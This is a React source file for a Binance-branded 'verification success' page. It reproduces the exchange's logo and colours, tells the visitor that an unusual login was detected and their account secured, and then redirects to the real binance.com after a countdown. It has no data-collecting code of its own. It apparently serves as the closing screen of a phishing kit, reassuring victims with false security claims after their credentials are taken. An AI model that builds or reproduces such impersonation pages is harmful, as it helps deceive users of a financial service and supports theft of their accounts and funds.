import React, { useState, useEffect } from 'react';
import { CheckCircle, Shield, Clock } from 'lucide-react';
import { Card, CardContent } from '@/components/ui/card';

const VerificationSuccess = () => {
  const demoEmail = "user@example.com";
  const [countdown, setCountdown] = useState(10);
  const [redirecting, setRedirecting] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = 'https://www.binance.com';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleRedirect = () => {
    setRedirecting(true);
    window.location.href = 'https://www.binance.com';
  };

  return (
    <div className="min-h-screen w-full bg-[#0B0E11] flex flex-col"> {/* Darker background */}
      {/* Binance Logo */}
      <div className="md:mb-[20px] md:p-0 pt-[12px] px-6 pb-[20px] mb-[8px]">
        <svg height="28" width="140" className="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path>
        </svg>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <Card className="w-full max-w-lg bg-[#161C23] border-[#2A3139] shadow-xl"> {/* Darker card */}
          <CardContent className="p-6">
            <div className="flex flex-col items-center text-center">
              {/* ... existing icon and heading ... */}


              <div className="flex items-center space-x-2 mb-6">
                <Shield className="w-5 h-5 text-[#F0B90B]" /> {/* Binance yellow */}
                <span className="text-sm text-[#848E9C]">
                  Enhanced Security Measures Active
                </span>
              </div>

              <div className="text-left mb-6 p-4 rounded-lg bg-[#1E262F] border border-[#2A3139]"> {/* Darker background */}
                <h2 className="text-lg font-semibold mb-3 text-[#EAECEF]"> {/* Brighter text */}
                  Security Alert Details
                </h2>
                <ul className="space-y-2 text-sm text-[#848E9C]">
                    <li>• Unusual login attempt was detected from a new device</li>
                    <li>• Our security system automatically secured your account</li>
                    <li>• Additional verification was completed successfully</li>
                    <li>• Your account security has been enhanced</li>
                    <li>• You can now safely proceed to login</li>
                </ul>
              </div>

              <button
                onClick={handleRedirect}
                disabled={redirecting}
                className={`w-full py-3 px-4 rounded-lg bg-[#F0B90B] hover:bg-[#F8D33A] transition-colors font-medium text-[#0B0E11] flex items-center justify-center space-x-2 ${redirecting ? 'opacity-80' : ''}`}
              >
                <Clock className="w-4 h-4" />
                <span>Continue to Binance ({countdown}s)</span>
              </button>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default VerificationSuccess;